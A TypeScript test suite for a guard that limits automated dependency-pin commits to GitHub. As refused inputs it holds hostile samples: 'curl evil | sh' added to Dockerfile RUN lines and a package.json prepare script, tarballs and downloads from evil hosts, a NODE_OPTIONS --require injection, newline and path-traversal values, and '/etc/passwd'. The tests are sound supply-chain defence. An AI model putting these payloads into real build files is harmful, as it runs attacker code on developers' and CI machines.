/**
 * The pin guard as its attacker would try it: `commitPins` asked straight, through the live actions against the fake
 * GitHub, with what a watch gone wrong, or anyone who could ask the worker, might send. Each refusal is before GitHub is
 * asked to write anything; and no other action writes a pin branch.
 */

import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DiskArtifacts } from '@software-factory/store';
import fc from 'fast-check';
import { describe, expect, it } from 'vitest';
import { DryRunActions, LiveActions } from '../../src/github/actions.ts';
import { BranchRefused, PIN_PREFIX } from '../../src/github/branches.ts';
import { GitHubError } from '../../src/github/client.ts';
import { PatchRefused } from '../../src/github/patches.ts';
import {
  forbiddenPin,
  guardPinBranch,
  madeRefusal,
  type PinCommit,
  pinBranchFor,
  treeSource,
} from '../../src/github/pin-guard.ts';
import { client, quiet, type Sent } from './fake.ts';
import { digest, FakeRepo, FILES, writes } from './pins-harness.ts';

const REPO = 'the-roganator/cv-software-factory';
const SIDECAR = `2.11.2@${digest('sidecar/old')}`;
const NEWER = `2.14.3@${digest('sidecar/new')}`;

function live(repo: FakeRepo) {
  const sent: Sent[] = [];
  const { github } = client(repo.routes(), sent);
  return { actions: new LiveActions(github), sent, github };
}

const asked = (repo: FakeRepo, over: Partial<PinCommit> = {}): PinCommit => ({
  branch: 'factory/pin/example-sidecar',
  base: repo.main,
  scanned: repo.main,
  message: 'chore(pin): move example/sidecar to 2.14.3',
  pins: [{ file: 'deploy/base/telemetry/values/logs.yaml', line: 4, from: SIDECAR, to: NEWER }],
  ...over,
});

/** Refused, as what kind, before anything was written. */
async function refuses(
  repo: FakeRepo,
  over: Partial<PinCommit>,
  kind: typeof BranchRefused | typeof PatchRefused,
  words: RegExp,
) {
  const { actions, sent } = live(repo);
  const error = await actions.commitPins(REPO, asked(repo, over)).catch((e: unknown) => e);
  expect(error).toBeInstanceOf(kind);
  expect((error as Error).message).toMatch(words);
  expect(writes(sent)).toEqual([]);
}

describe('the pin guard', () => {
  it('lets a commit replace the version or digest at a pin, and nothing else', async () => {
    const repo = new FakeRepo(FILES);
    const base = repo.main;
    const sha = await live(repo).actions.commitPins(REPO, asked(repo));
    expect(repo.refs.get('factory/pin/example-sidecar')).toBe(sha);
    const was = FILES['deploy/base/telemetry/values/logs.yaml'] as string;
    expect(repo.file(sha, 'deploy/base/telemetry/values/logs.yaml')).toBe(was.replace(SIDECAR, NEWER));
    for (const [path, text] of Object.entries(FILES))
      if (path !== 'deploy/base/telemetry/values/logs.yaml') expect(repo.file(sha, path)).toBe(text);
    expect(repo.main).toBe(base);
  });

  it('refuses a pin whose line has changed since the scan read it', async () => {
    const repo = new FakeRepo(FILES);
    const scanned = repo.main;
    repo.push({
      'deploy/base/telemetry/values/logs.yaml': (FILES['deploy/base/telemetry/values/logs.yaml'] as string).replace(
        '    tag',
        '    tag ',
      ),
    });
    await refuses(repo, { scanned }, PatchRefused, /has changed since the scan read it/);
  });

  it.each([
    ['latest', /not a version or a tag with its digest/],
    ['2.14.3@sha256:abc', /not a version or a tag with its digest/],
    [`2.14.3@${digest('x')}\n    evil: true`, /not a version or a tag with its digest/],
    [`2.14.3 @${digest('x')}`, /not a version or a tag with its digest/],
    ['2.14.3', /version alone where it pinned a digest/],
    [`main@${digest('x')}`, /tag main where it pinned 2\.11\.2: a tag that is not a version moves its digest alone/],
    [`2.14.3@${digest('x')}@${digest('y')}`, /not a version or a tag with its digest/],
  ])('refuses a target that is not a version or digest by the grammar: %j', async (to, words) => {
    const repo = new FakeRepo(FILES);
    await refuses(
      repo,
      { pins: [{ file: 'deploy/base/telemetry/values/logs.yaml', line: 4, from: SIDECAR, to }] },
      PatchRefused,
      words,
    );
  });

  it('moves the digest of a tag that is not a version, and never its name', async () => {
    const file = 'deploy/base/telemetry/values/debian.yaml';
    const [old, now] = [`bookworm@${digest('debian/old')}`, `bookworm@${digest('debian/new')}`];
    const repo = new FakeRepo({ ...FILES, [file]: `image:\n  tag: ${old}\n` });
    const sha = await live(repo).actions.commitPins(
      REPO,
      asked(repo, { pins: [{ file, line: 2, from: old, to: now }] }),
    );
    expect(repo.file(sha, file)).toBe(`image:\n  tag: ${now}\n`);
    await refuses(
      repo,
      { pins: [{ file, line: 2, from: old, to: `trixie@${digest('debian/new')}` }] },
      PatchRefused,
      /tag trixie where it pinned bookworm/,
    );
  });

  it('refuses a pin whose file is a symbolic link, though the contents API reads through it', async () => {
    const repo = new FakeRepo({
      ...FILES,
      'deploy/base/telemetry/values/link.yaml': { mode: '120000', text: 'deploy/base/telemetry/values/logs.yaml' },
    });
    await refuses(
      repo,
      { pins: [{ file: 'deploy/base/telemetry/values/link.yaml', line: 4, from: SIDECAR, to: NEWER }] },
      PatchRefused,
      /not an ordinary file in main \(mode 120000\)/,
    );
  });

  it('refuses a pin in a submodule, or in a file that is not there', async () => {
    const repo = new FakeRepo({ ...FILES, vendor: { mode: '160000', text: '' } });
    await refuses(
      repo,
      { pins: [{ file: 'vendor', line: 1, from: '1.0.0', to: '1.0.1' }] },
      PatchRefused,
      /mode 160000/,
    );
    await refuses(
      repo,
      { pins: [{ file: 'nowhere.yaml', line: 1, from: '1.0.0', to: '1.0.1' }] },
      PatchRefused,
      /not a file in main/,
    );
  });

  it.each([
    'factory/pin/../main',
    'factory/pin/a/b',
    'factory/pin/',
    'factory/pin/x.lock',
    'factory/pin/-x',
    'factory/pin/x..y',
    'factory/pin-next/example',
    'factory/1234-fix',
    'main',
    'dependabot/docker/x-1.0.0',
  ])('refuses a branch that is not a pin move’s own: %s', async (branch) => {
    const repo = new FakeRepo(FILES);
    await refuses(repo, { branch }, BranchRefused, /not a pin move's branch/);
  });

  it('makes of any files a branch under factory/pin/, of one segment the guard takes, the majors’ apart', () => {
    fc.assert(
      fc.property(
        fc.array(fc.string({ maxLength: 200 }), { minLength: 1, maxLength: 4 }),
        fc.boolean(),
        (files, major) => {
          const branch = pinBranchFor(files, major);
          expect(branch.startsWith(PIN_PREFIX)).toBe(true);
          expect(() => guardPinBranch(branch)).not.toThrow();
          // The same files give the same branch in any order, and the majors' is another.
          expect(pinBranchFor([...files].reverse(), major)).toBe(branch);
          expect(pinBranchFor(files, !major)).not.toBe(branch);
        },
      ),
    );
    expect(pinBranchFor(['../../main'])).toMatch(/^factory\/pin\/main-[0-9a-f]{8}$/);
    expect(pinBranchFor(['deploy/base/postgres/statefulset.yaml'])).toMatch(
      /^factory\/pin\/deploy-base-postgres-statefulset\.yaml-[0-9a-f]{8}$/,
    );
    expect(pinBranchFor(['deploy/base/telemetry/logs.yaml'], true)).toMatch(
      /^factory\/pin\/deploy-base-telemetry-logs\.yaml-major-[0-9a-f]{8}$/,
    );
    // Paths that fold to one segment, or are cut to one, are still two branches; a lockfile's name ends no ref `.lock`.
    expect(pinBranchFor(['a/b.yaml'])).not.toBe(pinBranchFor(['a-b.yaml']));
    expect(pinBranchFor([`${'x'.repeat(90)}/one`])).not.toBe(pinBranchFor([`${'x'.repeat(90)}/two`]));
    expect(pinBranchFor(['mise.lock'])).not.toMatch(/\.lock$/);
    // A move at two files is on the branch of both, named by the first.
    const two = pinBranchFor(['deploy/b.yaml', 'deploy/a.yaml']);
    expect(two).toMatch(/^factory\/pin\/deploy-a\.yaml-[0-9a-f]{8}$/);
    expect(two).not.toBe(pinBranchFor(['deploy/a.yaml']));
  });

  it('refuses two pins at one line', async () => {
    const repo = new FakeRepo(FILES);
    const pin = { file: 'deploy/base/telemetry/values/logs.yaml', line: 4, from: SIDECAR, to: NEWER };
    await refuses(
      repo,
      { pins: [pin, { ...pin, to: `2.14.4@${digest('z')}` }] },
      PatchRefused,
      /named twice in one pin move/,
    );
  });

  it.each([
    ['.github/workflows/check.yml', /workflow/],
    ['policy/vulnerabilities.ts', /rules of the line/],
    ['pnpm-lock.yaml', /lockfile/],
    ['apps/console/pnpm-lock.yaml', /lockfile/],
    ['pnpm-lock.dev.yaml', /lockfile/],
    ['apps/console/npm-shrinkwrap.json', /lockfile/],
    ['mise.toml', /mise’s files are written by the scan’s pin step/],
    ['mise.lock', /mise’s files are written by the scan’s pin step/],
    ['../outside.yaml', /not a plain path/],
    ['/etc/passwd', /not a plain path/],
  ])('refuses a pin in %s by its name', async (file, words) => {
    const repo = new FakeRepo({ ...FILES, [file.replace(/^\/|^\.\.\//, '')]: `version: ${SIDECAR}\n` });
    await refuses(repo, { pins: [{ file, line: 1, from: SIDECAR, to: NEWER }] }, PatchRefused, words);
    if (!file.startsWith('/') && !file.startsWith('..')) expect(forbiddenPin(file)).toBeDefined();
  });

  it('refuses a pin its line does not hold once as a word of its own', async () => {
    const repo = new FakeRepo({ ...FILES, 'twice.yaml': `a: 1.0.0 # was 1.0.0\nb: 11.0.0\n` });
    await refuses(
      repo,
      { pins: [{ file: 'twice.yaml', line: 1, from: '1.0.0', to: '1.0.1' }] },
      PatchRefused,
      /2 times/,
    );
    await refuses(
      repo,
      { pins: [{ file: 'twice.yaml', line: 2, from: '1.0.0', to: '1.0.1' }] },
      PatchRefused,
      /nowhere/,
    );
  });

  it('refuses a move that pins what it pins already, or nothing', async () => {
    const repo = new FakeRepo(FILES);
    await refuses(
      repo,
      { pins: [{ file: 'deploy/base/telemetry/values/logs.yaml', line: 4, from: SIDECAR, to: SIDECAR }] },
      PatchRefused,
      /already/,
    );
    await refuses(repo, { pins: [] }, PatchRefused, /moves nothing/);
  });

  it('makes no commit when main has moved since the watch read it', async () => {
    const repo = new FakeRepo(FILES);
    const base = repo.main;
    repo.push({ 'README.md': 'later\n' });
    const { actions, sent } = live(repo);
    const error = await actions.commitPins(REPO, asked(repo, { base, scanned: base })).catch((e: unknown) => e);
    expect(error).toBeInstanceOf(GitHubError);
    expect((error as GitHubError).kind).toBe('conflict');
    expect(writes(sent)).toEqual([]);
  });

  it('refuses a tree GitHub cut short', async () => {
    const repo = new FakeRepo(FILES);
    const routes = repo
      .routes()
      .map((route) =>
        String(route.path).includes('trees')
          ? { ...route, answer: (s: Sent) => ({ body: { ...(route.answer(s).body as object), truncated: true } }) }
          : route,
      );
    const sent: Sent[] = [];
    const actions = new LiveActions(client(routes, sent).github);
    const error = await actions.commitPins(REPO, asked(repo)).catch((e: unknown) => e);
    expect(error).toBeInstanceOf(PatchRefused);
    expect((error as Error).message).toMatch(/cut the tree .* short/);
    expect(writes(sent)).toEqual([]);
  });

  it.each(['factory/pin/example-sidecar', 'factory/pin-next/example-sidecar'])(
    'leaves no other action to write a pin branch: %s',
    async (branch) => {
      const repo = new FakeRepo(FILES);
      const { actions, sent } = live(repo);
      const commit = { branch, expectedHead: repo.main, message: 'x', changes: { additions: [], deletions: [] } };
      await expect(actions.setBranch(REPO, branch, repo.main, { force: true })).rejects.toBeInstanceOf(BranchRefused);
      await expect(actions.deleteBranch(REPO, branch)).rejects.toBeInstanceOf(BranchRefused);
      await expect(actions.commit(REPO, commit)).rejects.toBeInstanceOf(BranchRefused);
      await expect(
        actions.applyPatch(REPO, { branch, expectedHead: repo.main, patch: '', message: 'x' }),
      ).rejects.toBeInstanceOf(BranchRefused);
      const dry = new DryRunActions(new DiskArtifacts(mkdtempSync(join(tmpdir(), 'pin-guard-'))), quiet);
      await expect(dry.setBranch(REPO, branch, repo.main)).rejects.toBeInstanceOf(BranchRefused);
      await expect(dry.commit(REPO, commit)).rejects.toBeInstanceOf(BranchRefused);
      expect(writes(sent)).toEqual([]);
    },
  );

  it('refuses in a dry run what it refuses live, against the repository as GitHub has it', async () => {
    const repo = new FakeRepo(FILES);
    const sent: Sent[] = [];
    const { github } = client(repo.routes(), sent);
    const dry = new DryRunActions(
      new DiskArtifacts(mkdtempSync(join(tmpdir(), 'pin-guard-'))),
      quiet,
      undefined,
      undefined,
      undefined,
      undefined,
      treeSource(github),
    );
    await expect(dry.commitPins(REPO, asked(repo, { branch: 'main' }))).rejects.toBeInstanceOf(BranchRefused);
    await expect(
      dry.commitPins(REPO, asked(repo, { pins: [{ file: 'mise.toml', line: 2, from: '10.9.5', to: '10.9.6' }] })),
    ).rejects.toBeInstanceOf(PatchRefused);
    const sha = await dry.commitPins(REPO, asked(repo));
    expect(dry.commitMade(sha)?.files.get('deploy/base/telemetry/values/logs.yaml')).toContain(NEWER);
    expect(writes(sent)).toEqual([]);
  });
});

describe('the pin guard, for the files the scan’s pin step wrote', () => {
  const LOCK = 'lockfileVersion: 9.0\n\npackages:\n\n  example-a@1.0.0: {}\n';
  const MOVED = 'lockfileVersion: 9.0\n\npackages:\n\n  example-a@1.0.1: {}\n';
  const made = (path = 'pnpm-lock.yaml', text = MOVED) => ({
    branch: 'factory/pin/pnpm-lock.yaml-0a1b2c3d',
    pins: [],
    files: [{ path, text }],
  });

  it('writes a lockfile, mise’s files and a manifest whole, as the step wrote them, and nothing else', async () => {
    const repo = new FakeRepo({
      ...FILES,
      'pnpm-lock.yaml': LOCK,
      'mise.lock': '[[tools.k3d]]\nversion = "5.8.3"\n',
      'apps/factory/package.json': '{}\n',
    });
    const { actions } = live(repo);
    const sha = await actions.commitPins(REPO, asked(repo, made()));
    expect(repo.file(sha, 'pnpm-lock.yaml')).toBe(MOVED);
    for (const [path, text] of Object.entries(FILES))
      if (path !== 'pnpm-lock.yaml') expect(repo.file(sha, path)).toBe(text);
    const mise = await live(repo).actions.commitPins(
      REPO,
      asked(repo, {
        ...made('mise.lock', '[[tools.k3d]]\nversion = "5.9.0"\n'),
        branch: 'factory/pin/mise.lock-0a1b2c3d',
      }),
    );
    expect(repo.file(mise, 'mise.lock')).toBe('[[tools.k3d]]\nversion = "5.9.0"\n');
  });

  it.each([
    ['.github/workflows/check.yml', /not a file the scan’s pin step writes/],
    ['policy/package.json', /not a file the scan’s pin step writes/],
    ['deploy/base/postgres/statefulset.yaml', /not a file the scan’s pin step writes/],
    ['apps/console/mise.toml', /not a file the scan’s pin step writes/],
    ['apps/runner/Dockerfile.dockerignore', /not a file the scan’s pin step writes/],
    ['../pnpm-lock.yaml', /not a plain path/],
  ])('refuses to write %s whole', async (path, words) => {
    const repo = new FakeRepo({ ...FILES, 'pnpm-lock.yaml': LOCK });
    await refuses(repo, made(path), PatchRefused, words);
  });

  it('refuses a file that has changed since the scan made its moves, one written as it is, and one also edited', async () => {
    const repo = new FakeRepo({ ...FILES, 'pnpm-lock.yaml': LOCK });
    const scanned = repo.main;
    repo.push({ 'pnpm-lock.yaml': `${LOCK}\n` });
    await refuses(repo, { ...made(), scanned }, PatchRefused, /has changed since the scan made its moves/);
    await refuses(repo, made('pnpm-lock.yaml', `${LOCK}\n`), PatchRefused, /would be written as it is/);
    await refuses(
      repo,
      {
        ...made('deploy/base/telemetry/values/logs.yaml'),
        pins: [{ file: 'deploy/base/telemetry/values/logs.yaml', line: 4, from: SIDECAR, to: NEWER }],
      },
      PatchRefused,
      /not a file the scan’s pin step writes/,
    );
  });

  it('writes a Dockerfile whole, as an image’s move that brings its Node or its library wrote it, one Martin owns too', async () => {
    const owners = '/apps/console/Dockerfile @mrogan\n';
    const before = `FROM example/browsers:v1.0.0@sha256:${'1'.repeat(64)}\n`;
    const after = `FROM example/browsers:v1.0.1@sha256:${'2'.repeat(64)}\n`;
    const repo = new FakeRepo({
      ...FILES,
      '.github/CODEOWNERS': owners,
      'apps/factory/Dockerfile.browser': before,
      'apps/console/Dockerfile': before,
    });
    for (const path of ['apps/factory/Dockerfile.browser', 'apps/console/Dockerfile']) {
      const sha = await live(repo).actions.commitPins(REPO, asked(repo, made(path, after)));
      expect(repo.file(sha, path)).toBe(after);
    }
  });

  it('refuses a manifest CODEOWNERS gives Martin, and takes mise’s files, which he gives a move', async () => {
    const owners = '/mise.toml @mrogan\n/mise.lock @mrogan\n/apps/factory/src/github/ @mrogan\n';
    const repo = new FakeRepo({
      ...FILES,
      '.github/CODEOWNERS': owners,
      'apps/factory/src/github/package.json': '{}\n',
      'mise.lock': '[[tools.k3d]]\nversion = "5.8.3"\n',
    });
    await refuses(
      repo,
      made('apps/factory/src/github/package.json', '{"a":1}\n'),
      PatchRefused,
      /CODEOWNERS gives a person/,
    );
    const sha = await live(repo).actions.commitPins(
      REPO,
      asked(repo, {
        ...made('mise.lock', '[[tools.k3d]]\nversion = "5.9.0"\n'),
        branch: 'factory/pin/mise.lock-0a1b2c3d',
      }),
    );
    expect(repo.file(sha, 'mise.lock')).toContain('5.9.0');
  });
});

describe('the pin guard, for what a file the pin step wrote holds', () => {
  const sha = (c: string) => `sha256:${c.repeat(64)}`;
  const DOCKERFILE = `FROM node:24.22.2-slim@${sha('1')} AS build\nRUN pnpm install --frozen-lockfile\n`;
  const MISE_TOML = '[settings]\nminimum_release_age = "3d"\n\n[tools]\nnode = "24.22.2"\npnpm = "12"\n';
  const node = (version: string, sum: string) =>
    `[[tools.node]]\nversion = "${version}"\nbackend = "core:node"\nspecifiers = ["${version}"]\n\n` +
    `[tools.node."platforms.linux-x64"]\nchecksum = "${sha(sum)}"\n` +
    `url = "https://nodejs.org/dist/v${version}/node-v${version}-linux-x64.tar.gz"\n\n`;
  const PNPM = '[[tools.pnpm]]\nversion = "12.1.0"\nbackend = "aqua:pnpm/pnpm"\n';
  const tool = (version: string, asset: number, repository = 'argoproj/argo-cd') =>
    `[[tools.argocd]]\nversion = "${version}"\nbackend = "aqua:argoproj/argo-cd"\n\n` +
    `[tools.argocd."platforms.linux-x64"]\nchecksum = "${sha(String(asset % 10))}"\n` +
    `url = "https://github.com/${repository}/releases/download/v${version}/argocd-linux-amd64"\n` +
    `url_api = "https://api.github.com/repos/argoproj/argo-cd/releases/assets/${asset}"\n\n`;
  const TOOL_LOCK = `lockfile_version = 3\n\n${tool('3.6.1', 701)}`;
  const MISE_LOCK = `# @generated\n\nlockfile_version = 3\n\n${node('24.22.2', 'a')}${PNPM}`;
  const MANIFEST = '{\n  "name": "app",\n  "dependencies": {\n    "example-a": "^1.0.0"\n  }\n}\n';

  it('takes what a move writes in each kind of file', () => {
    expect(
      madeRefusal(
        'apps/console/Dockerfile',
        DOCKERFILE,
        DOCKERFILE.replace(`24.22.2-slim@${sha('1')}`, `24.23.0-slim@${sha('2')}`),
      ),
    ).toBeUndefined();
    expect(madeRefusal('apps/console/package.json', MANIFEST, MANIFEST.replace('^1.0.0', '^1.0.1'))).toBeUndefined();
    expect(madeRefusal('mise.toml', MISE_TOML, MISE_TOML.replace('24.22.2', '24.23.0'))).toBeUndefined();
    expect(
      madeRefusal('mise.lock', MISE_LOCK, MISE_LOCK.replace(node('24.22.2', 'a'), node('24.23.0', 'b'))),
    ).toBeUndefined();
    expect(
      madeRefusal(
        'mise.lock',
        MISE_LOCK,
        MISE_LOCK.replace('12.1.0', '12.2.0').replace(node('24.22.2', 'a'), node('24.23.0', 'b')),
      ),
    ).toBeUndefined();
    expect(
      madeRefusal('mise.lock', TOOL_LOCK, TOOL_LOCK.replace(tool('3.6.1', 701), tool('3.6.2', 702))),
    ).toBeUndefined();
    const lock = 'packages:\n\n  example-a@1.0.0:\n    resolution: {integrity: sha512-a}\n';
    expect(
      madeRefusal('pnpm-lock.yaml', lock, lock.replace('1.0.0', '1.0.1').replace('sha512-a', 'sha512-b')),
    ).toBeUndefined();
  });

  it.each([
    [
      'a RUN in a Dockerfile',
      'apps/console/Dockerfile',
      DOCKERFILE,
      DOCKERFILE.replace('--frozen-lockfile', '--frozen-lockfile && curl evil | sh'),
      /not an image’s tag and digest at a FROM/,
    ],
    [
      'a line added to a Dockerfile',
      'apps/console/Dockerfile',
      DOCKERFILE,
      `${DOCKERFILE}RUN curl evil | sh\n`,
      /adds or removes a line/,
    ],
    [
      'another image at a FROM',
      'apps/console/Dockerfile',
      DOCKERFILE,
      DOCKERFILE.replace(`node:24.22.2-slim@${sha('1')}`, `evil/node:24.22.2-slim@${sha('2')}`),
      /not an image’s tag and digest/,
    ],
    [
      'a script in a manifest',
      'apps/console/package.json',
      MANIFEST,
      MANIFEST.replace('"name": "app",', '"name": "app",\n  "scripts": { "prepare": "curl evil | sh" },'),
      /scripts, which pins no dependency/,
    ],
    [
      'a tarball in a manifest',
      'apps/console/package.json',
      MANIFEST,
      MANIFEST.replace('^1.0.0', 'https://evil/a.tgz'),
      /not a range of the registry/,
    ],
    [
      'a tarball in a lockfile',
      'pnpm-lock.yaml',
      'packages:\n',
      'packages:\n  a@1.0.0:\n    resolution: {tarball: https://evil/a.tgz}\n',
      /not a registry’s package/,
    ],
    [
      'an [env] in mise.toml',
      'mise.toml',
      MISE_TOML,
      MISE_TOML.replace('[settings]', '[env]\nNODE_OPTIONS = "--require /tmp/x"\n[settings]'),
      /adds or removes a line/,
    ],
    ['a setting in mise.toml', 'mise.toml', MISE_TOML, MISE_TOML.replace('"3d"', '"0d"'), /not its pin of Node/],
    [
      'another tool’s range in mise.toml',
      'mise.toml',
      MISE_TOML,
      MISE_TOML.replace('"12"', '"13"'),
      /not its pin of Node/,
    ],
    [
      'what is before mise.lock’s entries',
      'mise.lock',
      MISE_LOCK,
      MISE_LOCK.replace('= 3', '= 4'),
      /before its tools’ entries/,
    ],
    ['a tool’s backend', 'mise.lock', MISE_LOCK, MISE_LOCK.replace('aqua:pnpm/pnpm', 'cargo:evil'), /backend/],
    [
      'a download from elsewhere',
      'mise.lock',
      MISE_LOCK,
      MISE_LOCK.replace('https://nodejs.org', 'https://evil.example'),
      /from https:\/\/evil\.example/,
    ],
    [
      'a download moved to another repository on the same host',
      'mise.lock',
      TOOL_LOCK,
      TOOL_LOCK.replace(tool('3.6.1', 701), tool('3.6.2', 702, 'someone-else/argo-cd')),
      /from https:\/\/github\.com\/someone-else\/argo-cd\//,
    ],
    [
      'a download that climbs out of its repository',
      'mise.lock',
      TOOL_LOCK,
      TOOL_LOCK.replace(
        tool('3.6.1', 701),
        tool('3.6.2', 702, 'argoproj/argo-cd/releases/download/v3.6.2/../../../../../evil/x'),
      ),
      /from https:\/\/github\.com\/evil\/x\//,
    ],
    [
      'an asset of another repository',
      'mise.lock',
      TOOL_LOCK,
      TOOL_LOCK.replace(tool('3.6.1', 701), tool('3.6.2', 702).replace('repos/argoproj/argo-cd', 'repos/evil/argo-cd')),
      /from https:\/\/api\.github\.com\/repos\/evil\/argo-cd/,
    ],
    [
      'a section that is not the tool’s',
      'mise.lock',
      MISE_LOCK,
      MISE_LOCK.replace('[tools.node."platforms', '[settings."platforms'),
      /not its own/,
    ],
    [
      'a tool added to mise.lock',
      'mise.lock',
      MISE_LOCK,
      `${MISE_LOCK}\n[[tools.evil]]\nversion = "1.0.0"\n`,
      /adds, removes or reorders/,
    ],
  ])('refuses %s', (_, path, before, after, words) => {
    expect(madeRefusal(path, before, after)).toMatch(words);
  });

  it('refuses a commit whose file holds more than a move writes, before anything is written', async () => {
    const repo = new FakeRepo({ ...FILES, 'apps/console/Dockerfile': DOCKERFILE });
    await refuses(
      repo,
      {
        branch: 'factory/pin/apps-console-dockerfile-0a1b2c3d',
        pins: [],
        files: [{ path: 'apps/console/Dockerfile', text: `${DOCKERFILE}RUN curl evil | sh\n` }],
      },
      PatchRefused,
      /apps\/console\/Dockerfile is not what a move writes in it: it adds or removes a line/,
    );
  });
});

describe('the pin guard, as review found it', () => {
  it('refuses a number in a rule of the line CODEOWNERS gives Martin, and takes a pin under deploy/ or in a Dockerfile', async () => {
    const owners =
      '/.github/ @mrogan\n/deploy/ @mrogan\n/apps/factory/src/github/ @mrogan\n/apps/console/Dockerfile @mrogan\n';
    const repo = new FakeRepo({
      ...FILES,
      '.github/CODEOWNERS': owners,
      'apps/factory/src/github/pin-guard.ts': 'export const MAX_PINS = 20;\n',
      'apps/console/Dockerfile': `FROM node:24.1.0@${digest('node/old')}\n`,
    });
    await refuses(
      repo,
      { pins: [{ file: 'apps/factory/src/github/pin-guard.ts', line: 1, from: '20', to: '99' }] },
      PatchRefused,
      /a rule of the line CODEOWNERS gives a person/,
    );
    await live(repo).actions.commitPins(REPO, asked(repo));
    await live(repo).actions.commitPins(
      REPO,
      asked(repo, {
        branch: 'factory/pin/node',
        pins: [
          {
            file: 'apps/console/Dockerfile',
            line: 1,
            from: `24.1.0@${digest('node/old')}`,
            to: `24.1.1@${digest('node/new')}`,
          },
        ],
      }),
    );
  });

  it('refuses the Makefile by its name', async () => {
    const repo = new FakeRepo(FILES);
    await refuses(
      repo,
      { pins: [{ file: 'Makefile', line: 1, from: '10.9.5', to: '10.9.6' }] },
      PatchRefused,
      /Makefile/,
    );
  });

  it('keeps a byte-order mark, and every byte but the pin', async () => {
    const repo = new FakeRepo({ ...FILES, 'deploy/bom.yaml': '﻿tag: 1.0.0\n' });
    const sha = await live(repo).actions.commitPins(
      REPO,
      asked(repo, { pins: [{ file: 'deploy/bom.yaml', line: 1, from: '1.0.0', to: '1.0.1' }] }),
    );
    expect(repo.file(sha, 'deploy/bom.yaml')).toBe('﻿tag: 1.0.1\n');
  });

  it('refuses a version that is part of a path, not a word of its own', async () => {
    const repo = new FakeRepo({ ...FILES, 'deploy/url.yaml': 'url: https://example.test/v1.2.3/install.sh\n' });
    await refuses(
      repo,
      { pins: [{ file: 'deploy/url.yaml', line: 1, from: 'v1.2.3', to: 'v1.2.4' }] },
      PatchRefused,
      /nowhere/,
    );
  });
});
